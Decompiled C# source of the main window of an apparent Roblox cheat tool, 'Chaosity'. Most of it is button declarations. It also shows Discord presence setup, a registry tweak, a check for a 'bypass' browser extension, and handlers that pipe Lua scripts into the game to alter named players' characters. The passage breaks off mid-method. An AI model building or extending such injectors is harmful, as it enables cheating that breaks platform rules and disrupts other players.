// Decompiled with JetBrains decompiler
// Type: Chaosity.DGameHubMain
// Assembly: Chaosity, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 8FD1C12D-B5CF-4C0B-B451-47DE735C992C
// Assembly location: C:\Users\povar\Desktop\Chaosity (Exploit)\ChaosityExploit.exe

using DiscordRpcDemo;
using FlatUI;
using Microsoft.Win32;
using ModuleAPI;
using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace Chaosity
{
  public class DGameHubMain : Form
  {
    private Module api;
    private bool isClickDeleteEnabled;
    private Point lastPoint;
    private DiscordRpc.RichPresence presence;
    private DiscordRpc.EventHandlers handlers;
    private WebClient webClient;
    private OpenFileDialog open;
    private Module module;
    private IContainer components;
    private FormSkin formSkin1;
    private FlatTabControl flatTabControl1;
    private TabPage tabPage1;
    private FlatButton flatButton73;
    private FlatButton flatButton78;
    private FlatButton flatButton79;
    private FlatButton flatButton80;
    private FlatButton flatButton81;
    private RichTextBox richTextBox2;
    private FlatButton flatButton26;
    private FlatButton flatButton27;
    private FlatButton flatButton28;
    private FlatButton flatButton29;
    private FlatButton flatButton30;
    private FlatButton flatButton21;
    private FlatButton flatButton22;
    private FlatButton flatButton23;
    private FlatButton flatButton24;
    private FlatButton flatButton25;
    private FlatButton flatButton16;
    private FlatButton flatButton17;
    private FlatButton flatButton18;
    private FlatButton flatButton19;
    private FlatButton flatButton20;
    private FlatButton flatButton11;
    private FlatButton flatButton12;
    private FlatButton flatButton13;
    private FlatButton flatButton14;
    private FlatButton flatButton15;
    private FlatButton flatButton4;
    private FlatButton flatButton7;
    private FlatButton flatButton8;
    private FlatButton flatButton9;
    private FlatButton flatButton10;
    private FlatButton flatButton5;
    private FlatButton flatButton6;
    private FlatButton flatButton2;
    private FlatButton flatButton1;
    private TabPage tabPage4;
    private FlatButton flatButton112;
    private FlatButton flatButton113;
    private FlatButton flatButton114;
    private FlatButton flatButton115;
    private FlatButton flatButton116;
    private FlatButton flatButton103;
    private FlatButton flatButton102;
    private FlatButton flatButton101;
    private FlatButton flatButton36;
    private FlatButton flatButton85;
    private FlatButton flatButton84;
    private FlatButton flatButton83;
    private FlatButton flatButton74;
    private FlatButton flatButton75;
    private FlatButton flatButton76;
    private FlatButton flatButton77;
    private FlatButton flatButton68;
    private FlatButton flatButton69;
    private FlatButton flatButton70;
    private FlatButton flatButton71;
    private FlatButton flatButton72;
    private FlatButton flatButton63;
    private FlatButton flatButton64;
    private FlatButton flatButton65;
    private FlatButton flatButton66;
    private FlatButton flatButton67;
    private FlatButton flatButton37;
    private FlatButton flatButton35;
    private FlatButton flatButton34;
    private FlatButton flatButton33;
    private TabPage tabPage11;
    private FlatButton flatButton246;
    private FlatButton flatButton247;
    private FlatButton flatButton248;
    private FlatButton flatButton249;
    private FlatButton flatButton250;
    private FlatButton flatButton251;
    private FlatButton flatButton240;
    private FlatButton flatButton241;
    private FlatButton flatButton242;
    private FlatButton flatButton243;
    private FlatButton flatButton244;
    private FlatButton flatButton245;
    private FlatButton flatButton222;
    private FlatButton flatButton223;
    private FlatButton flatButton224;
    private FlatButton flatButton225;
    private FlatButton flatButton226;
    private FlatButton flatButton227;
    private FlatButton flatButton216;
    private FlatButton flatButton217;
    private FlatButton flatButton218;
    private FlatButton flatButton219;
    private FlatButton flatButton220;
    private FlatButton flatButton221;
    private FlatButton flatButton215;
    private FlatButton flatButton214;
    private FlatButton flatButton213;
    private FlatButton flatButton212;
    private FlatButton flatButton211;
    private FlatButton flatButton210;
    private TabPage tabPage5;
    private FlatButton flatButton136;
    private FlatButton flatButton135;
    private FlatButton flatButton134;
    private FlatButton flatButton133;
    private FlatButton flatButton132;
    private FlatButton flatButton131;
    private FlatButton flatButton130;
    private FlatButton flatButton124;
    private FlatButton flatButton123;
    private FlatButton flatButton122;
    private FlatButton flatButton121;
    private FlatButton flatButton120;
    private FlatButton flatButton82;
    private RichTextBox richTextBox4;
    private FlatButton flatButton62;
    private FlatButton flatButton57;
    private FlatButton flatButton58;
    private FlatButton flatButton59;
    private FlatButton flatButton60;
    private FlatButton flatButton61;
    private FlatButton flatButton52;
    private FlatButton flatButton53;
    private FlatButton flatButton54;
    private FlatButton flatButton55;
    private FlatButton flatButton56;
    private FlatButton flatButton47;
    private FlatButton flatButton48;
    private FlatButton flatButton49;
    private FlatButton flatButton50;
    private FlatButton flatButton51;
    private FlatButton flatButton42;
    private FlatButton flatButton43;
    private FlatButton flatButton44;
    private FlatButton flatButton45;
    private FlatButton flatButton46;
    private TabPage tabPage10;
    private FlatButton flatButton209;
    private FlatButton flatButton208;
    private FlatButton flatButton207;
    private FlatButton flatButton206;
    private FlatButton flatButton205;
    private FlatButton flatButton204;
    private FlatButton flatButton198;
    private FlatButton flatButton199;
    private FlatButton flatButton200;
    private FlatButton flatButton201;
    private FlatButton flatButton202;
    private FlatButton flatButton203;
    private FlatButton flatButton197;
    private FlatButton flatButton196;
    private FlatButton flatButton195;
    private FlatButton flatButton194;
    private FlatButton flatButton193;
    private FlatButton flatButton192;
    private FlatButton flatButton191;
    private FlatButton flatButton190;
    private FlatButton flatButton189;
    private FlatButton flatButton188;
    private FlatButton flatButton187;
    private FlatButton flatButton186;
    private FlatButton flatButton179;
    private FlatButton flatButton180;
    private FlatButton flatButton181;
    private FlatButton flatButton182;
    private FlatButton flatButton183;
    private FlatButton flatButton184;
    private FlatButton flatButton177;
    private FlatButton flatButton176;
    private FlatButton flatButton175;
    private FlatButton flatButton174;
    private FlatButton flatButton173;
    private FlatButton flatButton172;
    private TabPage tabPage12;
    private FlatButton flatButton435;
    private FlatButton flatButton434;
    private FlatButton flatButton433;
    private FlatButton flatButton432;
    private FlatButton flatButton431;
    private FlatButton flatButton430;
    private FlatButton flatButton429;
    private FlatButton flatButton428;
    private FlatButton flatButton427;
    private FlatButton flatButton426;
    private FlatButton flatButton425;
    private FlatButton flatButton424;
    private FlatButton flatButton423;
    private FlatButton flatButton422;
    private FlatButton flatButton421;
    private FlatButton flatButton272;
    private FlatButton flatButton271;
    private FlatButton flatButton270;
    private FlatButton flatButton264;
    private FlatButton flatButton265;
    private FlatButton flatButton266;
    private FlatButton flatButton267;
    private FlatButton flatButton268;
    private FlatButton flatButton269;
    private FlatButton flatButton228;
    private FlatButton flatButton229;
    private FlatButton flatButton230;
    private FlatButton flatButton231;
    private FlatButton flatButton232;
    private FlatButton flatButton233;
    private FlatButton flatButton234;
    private FlatButton flatButton235;
    private FlatButton flatButton236;
    private FlatButton flatButton237;
    private FlatButton flatButton238;
    private FlatButton flatButton239;
    private TabPage tabPage2;
    private FlatButton flatButton125;
    private FlatButton flatButton126;
    private FlatButton flatButton127;
    private FlatButton flatButton128;
    private FlatButton flatButton129;
    private FlatButton flatButton117;
    private FlatButton flatButton118;
    private FlatButton flatButton119;
    private FlatButton flatButton110;
    private FlatButton flatButton109;
    private FlatButton flatButton108;
    private FlatButton flatButton107;
    private FlatButton flatButton106;
    private FlatButton flatButton105;
    private FlatButton flatButton104;
    private FlatButton flatButton100;
    private FlatButton flatButton99;
    private FlatButton flatButton98;
    private FlatButton flatButton86;
    private FlatButton flatButton87;
    private FlatButton flatButton88;
    private FlatButton flatButton89;
    private FlatButton flatButton90;
    private FlatButton flatButton91;
    private FlatButton flatButton92;
    private FlatButton flatButton93;
    private FlatButton flatButton94;
    private FlatButton flatButton95;
    private FlatButton flatButton96;
    private FlatButton flatButton97;
    private TabPage tabPage7;
    private FlatButton flatButton279;
    private FlatButton flatButton147;
    private FlatButton flatButton148;
    private FlatButton flatButton149;
    private FlatButton flatButton150;
    private FlatButton flatButton151;
    private FlatButton flatButton141;
    private FlatButton flatButton142;
    private FlatButton flatButton143;
    private FlatButton flatButton145;
    private FlatButton flatButton146;
    private FlatButton flatButton140;
    private FlatButton flatButton138;
    private FlatButton flatButton139;
    private FlatButton flatButton137;
    private FlatButton flatButton144;
    private TabPage tabPage8;
    private FlatButton flatButton167;
    private RichTextBox richTextBox5;
    private FlatButton flatButton162;
    private FlatButton flatButton163;
    private FlatButton flatButton164;
    private FlatButton flatButton165;
    private FlatButton flatButton166;
    private FlatButton flatButton152;
    private FlatButton flatButton153;
    private FlatButton flatButton154;
    private FlatButton flatButton155;
    private FlatButton flatButton156;
    private FlatButton flatButton157;
    private FlatButton flatButton158;
    private FlatButton flatButton159;
    private FlatButton flatButton160;
    private FlatButton flatButton161;
    private TabPage tabPage9;
    private FlatButton flatButton273;
    private FlatButton flatButton185;
    private FlatButton flatButton178;
    private FlatButton flatButton171;
    private FlatButton flatButton170;
    private FlatButton flatButton169;
    private FlatButton flatButton168;
    private TabPage tabPage13;
    private FlatButton flatButton274;
    private FlatButton flatButton261;
    private FlatButton flatButton254;
    private FlatButton flatButton253;
    private FlatButton flatButton252;
    private TabPage tabPage14;
    private FlatButton flatButton260;
    private FlatButton flatButton259;
    private FlatButton flatButton258;
    private FlatButton flatButton257;
    private FlatButton flatButton256;
    private FlatButton flatButton255;
    private TabPage tabPage15;
    private FlatButton flatButton278;
    private FlatButton flatButton277;
    private FlatButton flatButton276;
    private TabPage tabPage16;
    private FlatButton flatButton300;
    private FlatButton flatButton301;
    private FlatButton flatButton287;
    private FlatButton flatButton282;
    private FlatButton flatButton281;
    private TabPage tabPage17;
    private FlatButton flatButton289;
    private FlatButton flatButton288;
    private FlatButton flatButton286;
    private FlatButton flatButton285;
    private FlatButton flatButton284;
    private FlatButton flatButton283;
    private TabPage tabPage18;
    private FlatButton flatButton293;
    private FlatButton flatButton292;
    private FlatButton flatButton291;
    private FlatButton flatButton290;
    private TabPage tabPage19;
    private FlatButton flatButton298;
    private FlatButton flatButton297;
    private FlatButton flatButton296;
    private FlatButton flatButton295;
    private FlatButton flatButton294;
    private TabPage tabPage20;
    private FlatButton flatButton313;
    private FlatButton flatButton311;
    private FlatButton flatButton302;
    private TabPage tabPage21;
    private FlatButton flatButton306;
    private FlatButton flatButton305;
    private FlatButton flatButton304;
    private FlatButton flatButton303;
    private TabPage tabPage22;
    private FlatButton flatButton310;
    private FlatButton flatButton309;
    private FlatButton flatButton308;
    private FlatButton flatButton307;
    private TabPage tabPage23;
    private FlatButton flatButton315;
    private FlatButton flatButton316;
    private FlatButton flatButton263;
    private TabPage tabPage24;
    private FlatButton flatButton320;
    private FlatButton flatButton319;
    private FlatButton flatButton318;
    private FlatButton flatButton317;
    private TabPage tabPage25;
    private FlatButton flatButton321;
    private FlatButton flatButton322;
    private FlatButton flatButton323;
    private FlatButton flatButton324;
    private TabPage tabPage26;
    private FlatButton flatButton327;
    private FlatButton flatButton328;
    private FlatButton flatButton326;
    private FlatButton flatButton325;
    private TabPage tabPage27;
    private FlatButton flatButton331;
    private FlatButton flatButton332;
    private FlatButton flatButton330;
    private FlatButton flatButton329;
    private TabPage tabPage28;
    private FlatButton flatButton335;
    private FlatButton flatButton336;
    private FlatButton flatButton334;
    private FlatButton flatButton333;
    private TabPage tabPage29;
    private FlatButton flatButton338;
    private FlatButton flatButton337;
    private TabPage tabPage30;
    private FlatButton flatButton341;
    private FlatButton flatButton340;
    private FlatButton flatButton339;
    private TabPage tabPage31;
    private FlatButton flatButton345;
    private FlatButton flatButton344;
    private FlatButton flatButton343;
    private FlatButton flatButton342;
    private TabPage tabPage32;
    private FlatButton flatButton349;
    private FlatButton flatButton348;
    private FlatButton flatButton347;
    private FlatButton flatButton346;
    private TabPage tabPage33;
    private FlatButton flatButton354;
    private FlatButton flatButton353;
    private FlatButton flatButton352;
    private FlatButton flatButton351;
    private FlatButton flatButton350;
    private TabPage tabPage34;
    private FlatButton flatButton358;
    private FlatButton flatButton355;
    private FlatButton flatButton356;
    private FlatButton flatButton357;
    private TabPage tabPage35;
    private FlatButton flatButton361;
    private FlatButton flatButton362;
    private FlatButton flatButton360;
    private FlatButton flatButton359;
    private TabPage tabPage36;
    private FlatButton flatButton363;
    private FlatButton flatButton364;
    private FlatButton flatButton365;
    private FlatButton flatButton366;
    private TabPage tabPage37;
    private FlatButton flatButton367;
    private FlatButton flatButton368;
    private FlatButton flatButton369;
    private FlatButton flatButton370;
    private TabPage tabPage38;
    private FlatButton flatButton371;
    private FlatButton flatButton372;
    private FlatButton flatButton373;
    private FlatButton flatButton374;
    private TabPage tabPage39;
    private FlatButton flatButton375;
    private FlatButton flatButton376;
    private TabPage tabPage40;
    private FlatButton flatButton379;
    private FlatButton flatButton380;
    private FlatButton flatButton377;
    private FlatButton flatButton378;
    private TabPage tabPage41;
    private FlatButton flatButton381;
    private FlatButton flatButton382;
    private FlatButton flatButton383;
    private FlatButton flatButton384;
    private TabPage tabPage42;
    private FlatButton flatButton385;
    private FlatButton flatButton386;
    private FlatButton flatButton387;
    private FlatButton flatButton388;
    private TabPage tabPage43;
    private FlatButton flatButton392;
    private FlatButton flatButton391;
    private FlatButton flatButton389;
    private FlatButton flatButton390;
    private TabPage tabPage44;
    private FlatButton flatButton396;
    private FlatButton flatButton393;
    private FlatButton flatButton394;
    private FlatButton flatButton395;
    private TabPage tabPage45;
    private FlatButton flatButton397;
    private FlatButton flatButton398;
    private FlatButton flatButton399;
    private FlatButton flatButton400;
    private TabPage tabPage46;
    private FlatButton flatButton401;
    private FlatButton flatButton402;
    private FlatButton flatButton403;
    private FlatButton flatButton404;
    private TabPage tabPage47;
    private FlatButton flatButton405;
    private FlatButton flatButton406;
    private FlatButton flatButton407;
    private FlatButton flatButton408;
    private TabPage tabPage48;
    private FlatButton flatButton409;
    private FlatButton flatButton410;
    private FlatButton flatButton411;
    private FlatButton flatButton412;
    private TabPage tabPage49;
    private FlatButton flatButton413;
    private FlatButton flatButton414;
    private FlatButton flatButton415;
    private FlatButton flatButton416;
    private TabPage tabPage50;
    private FlatButton flatButton420;
    private FlatButton flatButton417;
    private FlatButton flatButton418;
    private FlatButton flatButton419;
    private TabPage tabPage51;
    private FlatButton flatButton436;
    private FlatButton flatButton437;
    private TabPage tabPage52;
    private FlatButton flatButton438;
    private FlatButton flatButton439;
    private TabPage tabPage53;
    private FlatButton flatButton440;
    private FlatButton flatButton441;
    private TabPage tabPage54;
    private FlatButton flatButton442;
    private FlatButton flatButton443;
    private TabPage tabPage55;
    private FlatButton flatButton444;
    private FlatButton flatButton445;
    private TabPage tabPage56;
    private FlatButton flatButton446;
    private FlatButton flatButton447;
    private TabPage tabPage57;
    private FlatButton flatButton448;
    private FlatButton flatButton449;
    private TabPage tabPage58;
    private FlatButton flatButton450;
    private FlatButton flatButton451;
    private TabPage tabPage59;
    private FlatButton flatButton452;
    private FlatButton flatButton453;
    private TabPage tabPage60;
    private FlatButton flatButton455;
    private FlatButton flatButton456;
    private TabPage tabPage61;
    private FlatButton flatButton457;
    private FlatButton flatButton458;
    private TabPage tabPage62;
    private FlatButton flatButton454;
    private FlatButton flatButton459;
    private TabPage tabPage63;
    private TabPage tabPage64;
    private FlatButton flatButton460;
    private FlatButton flatButton461;
    private FlatButton flatButton462;
    private FlatButton flatButton463;
    private TabPage tabPage65;
    private FlatButton flatButton464;
    private FlatButton flatButton465;
    private TabPage tabPage66;
    private FlatButton flatButton472;
    private FlatButton flatButton471;
    private FlatButton flatButton469;
    private FlatButton flatButton468;
    private FlatButton flatButton467;
    private FlatButton flatButton466;
    private FlatButton flatButton470;
    private FlatButton flatButton473;
    private FlatButton flatButton474;
    private FlatButton flatButton475;
    private FlatButton flatButton476;
    private FlatButton flatButton477;
    private FlatButton flatButton478;
    private FlatButton flatButton479;
    private FlatButton flatButton480;
    private TabPage tabPage67;
    private FlatButton flatButton481;
    private TabPage tabPage68;
    private FlatButton flatButton482;
    private FlatButton flatButton483;
    private FlatButton flatButton484;
    private TabPage tabPage69;
    private FlatButton flatButton485;
    private TabPage tabPage70;
    private FlatButton flatButton486;
    private FlatButton flatButton487;
    private TabPage tabPage71;
    private FlatButton flatButton488;
    private FlatButton flatButton489;
    private TabPage tabPage72;
    private FlatButton flatButton490;
    private FlatButton flatButton491;
    private TabPage tabPage73;
    private FlatButton flatButton492;
    private TabPage tabPage74;
    private TabPage tabPage75;
    private TabPage tabPage76;
    private FlatButton flatButton493;
    private FlatButton flatButton494;
    private FlatButton flatButton495;
    private FlatButton flatButton496;
    private FlatButton flatButton497;
    private FlatButton flatButton498;
    private TabPage tabPage77;
    private FlatButton flatButton499;
    private TabPage tabPage78;
    private TabPage tabPage79;
    private TabPage tabPage80;
    private FlatButton flatButton500;
    private FlatButton flatButton501;
    private FlatButton flatButton502;
    private FlatButton flatButton503;
    private FlatButton flatButton504;
    private FlatButton flatButton506;
    private FlatButton flatButton505;
    private TabPage tabPage81;
    private TabPage tabPage82;
    private TabPage tabPage83;
    private FlatButton flatButton507;
    private FlatButton flatButton508;
    private FlatButton flatButton509;
    private FlatButton flatButton510;
    private FlatButton flatButton511;
    private FlatButton flatButton512;
    private TabPage tabPage84;
    private FlatButton flatButton513;
    private FlatButton flatButton514;
    private FlatButton flatButton515;
    private TabPage tabPage85;
    private FlatButton flatButton516;
    private FlatButton flatButton517;
    private TabPage tabPage86;
    private FlatButton flatButton518;
    private FlatButton flatButton519;
    private TabPage tabPage87;
    private FlatButton flatButton520;
    private TabPage tabPage88;
    private FlatButton flatButton521;
    private FlatButton flatButton522;
    private TabPage tabPage89;
    private FlatButton flatButton523;
    private FlatButton flatButton524;
    private TabPage tabPage90;
    private FlatButton flatButton525;
    private TabPage tabPage91;
    private FlatButton flatButton526;
    private TabPage tabPage92;
    private FlatButton flatButton527;
    private TabPage tabPage93;
    private TabPage tabPage94;
    private FlatButton flatButton529;
    private FlatButton flatButton528;
    private FlatButton flatButton530;
    private FlatButton flatButton531;
    private TabPage tabPage95;
    private FlatButton flatButton532;
    private FlatButton flatButton533;
    private TabPage tabPage96;
    private FlatButton flatButton534;
    private TabPage tabPage97;
    private FlatButton flatButton535;
    private FlatButton flatButton536;
    private TabPage tabPage98;
    private FlatButton flatButton538;
    private FlatButton flatButton537;
    private TabPage tabPage99;
    private FlatButton flatButton539;
    private FlatButton flatButton540;
    private PictureBox pictureBox3;
    private TabPage tabPage100;
    private FlatButton flatButton541;
    private FlatButton flatButton542;
    private FlatButton flatButton543;
    private TabPage tabPage101;
    private FlatButton flatButton544;
    private PictureBox pictureBox8;
    private TabPage tabPage102;
    private FlatButton flatButton546;
    private FlatButton flatButton545;
    private FlatButton flatButton547;
    private FlatButton flatButton549;
    private FlatButton flatButton548;
    private Panel panel2;
    private FlatButton flatButton551;
    private FlatButton flatButton552;
    private FlatButton flatButton553;
    private FlatButton flatButton554;
    private FlatButton flatButton555;
    private FlatButton flatButton550;
    private FlatButton flatButton561;
    private TabPage tabPage103;
    private FlatButton flatButton563;
    private TabPage tabPage104;
    private TabPage tabPage105;
    private FlatButton flatButton564;
    private FlatButton flatButton565;
    private FlatButton flatButton566;
    private FlatButton flatButton567;
    private FlatButton flatButton568;
    private TabPage tabPage106;
    private FlatButton flatButton569;
    private FlatButton flatButton570;
    private FlatButton flatButton571;
    private FlatButton flatButton572;
    private TabPage tabPage107;
    private FlatButton flatButton573;
    private FlatButton flatButton574;
    private TabPage tabPage108;
    private FlatButton flatButton575;
    private FlatButton flatButton576;
    private TabPage tabPage109;
    private FlatButton flatButton577;
    private FlatButton flatButton578;
    private TabPage tabPage110;
    private FlatButton flatButton579;
    private FlatButton flatButton580;
    private TabPage tabPage111;
    private TabPage tabPage112;
    private TabPage tabPage113;
    private FlatButton flatButton581;
    private FlatButton flatButton582;
    private FlatButton flatButton583;
    private FlatButton flatButton584;
    private FlatButton flatButton585;
    private FlatButton flatButton586;
    private TabPage tabPage114;
    private TabPage tabPage115;
    private FlatButton flatButton587;
    private FlatButton flatButton588;
    private FlatButton flatButton590;
    private FlatButton flatButton589;
    private TabPage tabPage116;
    private FlatButton flatButton591;
    private FlatButton flatButton592;
    private TabPage tabPage117;
    private FlatButton flatButton593;
    private FlatButton flatButton594;
    private TabPage tabPage118;
    private FlatButton flatButton595;
    private FlatButton flatButton596;
    private TabPage tabPage119;
    private FlatButton flatButton597;
    private FlatButton flatButton598;
    private TabPage tabPage120;
    private FlatButton flatButton599;
    private PictureBox pictureBox23;
    private TabPage tabPage121;
    private FlatButton flatButton600;
    private TabPage tabPage122;
    private FlatButton flatButton601;
    private FlatButton flatButton602;
    private FlatButton flatButton603;
    private TabPage tabPage123;
    private FlatButton flatButton604;
    private PictureBox pictureBox24;
    private TabPage tabPage124;
    private TabPage tabPage125;
    private FlatButton flatButton605;
    private FlatButton flatButton606;
    private FlatButton flatButton607;
    private FlatButton flatButton608;
    private TabPage tabPage126;
    private FlatButton flatButton609;
    private FlatButton flatButton610;
    private TabPage tabPage127;
    private FlatButton flatButton611;
    private FlatButton flatButton612;
    private TabPage tabPage128;
    private FlatButton flatButton613;
    private FlatButton flatButton614;
    private PictureBox pictureBox26;
    private PictureBox pictureBox27;
    private PictureBox pictureBox28;
    private PictureBox pictureBox29;
    private PictureBox pictureBox30;
    private PictureBox pictureBox31;
    private PictureBox pictureBox32;
    private TabPage tabPage129;
    private FlatButton flatButton615;
    private TabPage tabPage130;
    private FlatButton flatButton616;
    private TabPage tabPage131;
    private FlatButton flatButton617;
    private FlatButton flatButton618;
    private FlatButton flatButton619;
    private PictureBox pictureBox35;
    private TabPage tabPage132;
    private FlatButton flatButton620;
    private FlatButton flatButton621;
    private TabPage tabPage133;
    private FlatButton flatButton622;
    private FlatButton flatButton623;
    private TabPage tabPage134;
    private FlatButton flatButton624;
    private FlatButton flatButton625;
    private TabPage tabPage135;
    private FlatButton flatButton626;
    private TabPage tabPage136;
    private TabPage tabPage137;
    private FlatButton flatButton627;
    private FlatButton flatButton628;
    private FlatButton flatButton629;
    private FlatButton flatButton630;
    private TabPage tabPage138;
    private FlatButton flatButton631;
    private TabPage tabPage139;
    private TabPage tabPage140;
    private FlatButton flatButton632;
    private FlatButton flatButton633;
    private FlatButton flatButton634;
    private FlatButton flatButton635;
    private TabPage tabPage141;
    private FlatButton flatButton636;
    private FlatButton flatButton637;
    private TabPage tabPage142;
    private TabPage tabPage143;
    private FlatButton flatButton638;
    private FlatButton flatButton639;
    private FlatButton flatButton640;
    private FlatButton flatButton641;
    private TabPage tabPage144;
    private FlatButton flatButton642;
    private TabPage tabPage145;
    private TabPage tabPage146;
    private FlatButton flatButton643;
    private FlatButton flatButton644;
    private FlatButton flatButton645;
    private FlatButton flatButton646;
    private TabPage tabPage147;
    private FlatButton flatButton647;
    private TabPage tabPage148;
    private TabPage tabPage149;
    private FlatButton flatButton648;
    private FlatButton flatButton649;
    private FlatButton flatButton651;
    private FlatButton flatButton650;
    private TabPage tabPage150;
    private FlatButton flatButton652;
    private FlatButton flatButton653;
    private TabPage tabPage151;
    private FlatButton flatButton654;
    private FlatButton flatButton655;
    private TabPage tabPage152;
    private TabPage tabPage153;
    private FlatButton flatButton656;
    private FlatButton flatButton657;
    private FlatButton flatButton660;
    private FlatButton flatButton659;
    private FlatButton flatButton658;
    private TabPage tabPage154;
    private FlatButton flatButton262;
    private FlatButton flatButton661;
    private TabPage tabPage155;
    private FlatButton flatButton662;
    private FlatButton flatButton663;
    private TabPage tabPage156;
    private FlatButton flatButton664;
    private FlatButton flatButton665;
    private TabPage tabPage157;
    private FlatButton flatButton666;
    private FlatButton flatButton667;
    private TabPage tabPage158;
    private TabPage tabPage159;
    private FlatButton flatButton668;
    private FlatButton flatButton669;
    private FlatButton flatButton670;
    private FlatButton flatButton671;
    private TabPage tabPage160;
    private FlatButton flatButton672;
    private FlatButton flatButton673;
    private TabPage tabPage161;
    private TabPage tabPage162;
    private FlatButton flatButton674;
    private FlatButton flatButton675;
    private FlatButton flatButton676;
    private FlatButton flatButton677;
    private TabPage tabPage163;
    private FlatButton flatButton678;
    private FlatButton flatButton679;
    private TabPage tabPage164;
    private FlatButton flatButton680;
    private FlatButton flatButton681;
    private TabPage tabPage165;
    private FlatButton flatButton682;
    private FlatButton flatButton683;
    private TabPage tabPage166;
    private FlatButton flatButton684;
    private FlatButton flatButton685;
    private TabPage tabPage167;
    private TabPage tabPage168;
    private FlatButton flatButton686;
    private FlatButton flatButton687;
    private FlatButton flatButton688;
    private FlatButton flatButton689;
    private TabPage tabPage169;
    private WebBrowser webBrowser1;
    private Button button3;
    private Button button2;
    private Button button1;
    private Button button4;
    private CheckBox MultipleROBLOX;
    private Button button18;
    private CheckBox cb2;
    private Button button33;
    private Button button202;
    private Button button201;
    private Button button6;
    private Button button5;
    private Button button8;
    private Button button7;
    private Button button9;

    [DllImport("Gdi32.dll")]
    private static extern IntPtr CreateRoundRectRgn(
      int int_0,
      int int_1,
      int int_2,
      int int_3,
      int int_4,
      int int_5);

    private bool universalBypassInstalled()
    {
      return Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "/Google/Chrome/User Data/Default/Extensions/aihomhdbhpnpmcnnbckjjcebjoikpihj");
    }

    public DGameHubMain()
    {
      OpenFileDialog openFileDialog = new OpenFileDialog();
      openFileDialog.Filter = "Lua Script (*.txt)|*.txt|Lua Script (*.lua)|*.lua";
      openFileDialog.FilterIndex = 1;
      openFileDialog.Title = "Open Script";
      this.open = openFileDialog;
      this.module = new Module();
      this.components = (IContainer) null;
      // ISSUE: explicit constructor call
      this.InitializeComponent();
      this.handlers = new DiscordRpc.EventHandlers();
      DiscordRpc.Initialize("690288190283972619", ref this.handlers, true, (string) null);
      this.presence.state = "Project: Chaosity";
      this.presence.details = "Download Chaosity!";
      this.presence.startTimestamp = 0L;
      this.presence.largeImageKey = "chaosity_pfp";
      this.presence.largeImageText = "Project: Chaosity";
      this.presence.smallImageKey = "chaosity_pfp";
      this.presence.smallImageText = "Project: Chaosity";
      DiscordRpc.UpdatePresence(ref this.presence);
      this.TopMost = true;
      try
      {
        RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Internet Explorer\\Main\\FeatureControl\\FEATURE_BROWSER_EMULATION", true);
        string friendlyName = AppDomain.CurrentDomain.FriendlyName;
        if (registryKey.GetValue(friendlyName) == null)
          registryKey.SetValue(friendlyName, (object) 11001, RegistryValueKind.DWord);
      }
      catch (Exception ex)
      {
      }
      this.webBrowser1.Url = new Uri(string.Format("file:///{0}/Monaco/Monaco.html", (object) Directory.GetCurrentDirectory()));
    }

    private void tabPage6_Click(object sender, EventArgs e)
    {
    }

    private void flatButton57_Click(object sender, EventArgs e)
    {
    }

    private void flatButton58_Click(object sender, EventArgs e)
    {
    }

    private void flatButton59_Click(object sender, EventArgs e)
    {
    }

    private void flatButton60_Click(object sender, EventArgs e)
    {
    }

    private void flatButton61_Click(object sender, EventArgs e)
    {
    }

    private void flatButton27_Click(object sender, EventArgs e)
    {
    }

    private void flatButton28_Click(object sender, EventArgs e)
    {
    }

    private void flatButton29_Click(object sender, EventArgs e)
    {
    }

    private void flatButton23_Click(object sender, EventArgs e)
    {
    }

    private void flatButton24_Click(object sender, EventArgs e)
    {
    }

    private void flatButton25_Click(object sender, EventArgs e)
    {
    }

    private void flatButton26_Click(object sender, EventArgs e)
    {
    }

    private void flatButton17_Click(object sender, EventArgs e)
    {
    }

    private void flatButton18_Click(object sender, EventArgs e)
    {
    }

    private void flatButton19_Click(object sender, EventArgs e)
    {
    }

    private void flatButton20_Click(object sender, EventArgs e)
    {
    }

    private void flatButton21_Click(object sender, EventArgs e)
    {
    }

    private void flatButton12_Click(object sender, EventArgs e)
    {
    }

    private void flatButton13_Click(object sender, EventArgs e)
    {
    }

    private void flatButton14_Click(object sender, EventArgs e)
    {
    }

    private void flatButton15_Click(object sender, EventArgs e)
    {
    }

    private void flatButton16_Click(object sender, EventArgs e)
    {
    }

    private void flatButton11_Click(object sender, EventArgs e)
    {
    }

    private void flatButton10_Click(object sender, EventArgs e)
    {
    }

    private void flatButton9_Click(object sender, EventArgs e)
    {
    }

    private void flatButton8_Click(object sender, EventArgs e)
    {
    }

    private void flatButton7_Click(object sender, EventArgs e)
    {
    }

    private void flatButton1_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("pe = Instance.new('ParticleEmitter',game.Players. " + this.richTextBox2.Text + " .Character.Torso) pe.Texture = 'http://roblox.com/asset/?id=198328945' pe.VelocitySpread = 50");
    }

    private void tabPage5_Click(object sender, EventArgs e)
    {
    }

    private void flatButton2_Click(object sender, EventArgs e)
    {
      string text = this.richTextBox2.Text;
      NamedPipes.LuaPipe("local player = game:GetService('Players'). " + text + " local Fire = Instance.new('Fire', player.Character.Torso) Fire.Size = 20 Fire.Color = Color3.new(90,1,1) Fire.SecondaryColor = Color3.new(90,1,1) Fire.Heat = -500 local player = game:GetService('Players'). " + text + " local Fire = Instance.new('Fire', player.Character.Torso) Fire.Size = 20 Fire.Color = Color3.new(1,1,90) Fire.SecondaryColor = Color3.new(1,1,90) Fire.Heat = -500 local player = game:GetService('Players'). " + text + " local Fire = Instance.new('Fire', player.Character.Torso) Fire.Size = 20 Fire.Color = Color3.new(1,90,1) Fire.SecondaryColor = Color3.new(1,90,1) Fire.Heat = -500");
    }

    private void flatButton6_Click(object sender, EventArgs e)
    {
      NamedPipes.LuaPipe("local char = game.Players. " + this.richTextBox2.Text + " .Character local harambe = Instance.new('SpecialMesh', char.Torso) harambe.MeshType = 'FileMesh' harambe.MeshId = 'http://www.roblox.com/asset/?id=430330296' harambe.TextureId = 'http://www.roblox.com/asset/?id=430330316' harambe.Scale = Vector3.new(.1,.1,.1) char.Head.Transparency = 1 char['Left Arm'].Transparency = 1 char['Right Arm'].Transparency = 1 char['Left Leg'].Transparency = 1 char['Right Leg'].Transparency = 1");
    }

    private void flatButton5_Click(object sender, EventArgs e)
    {
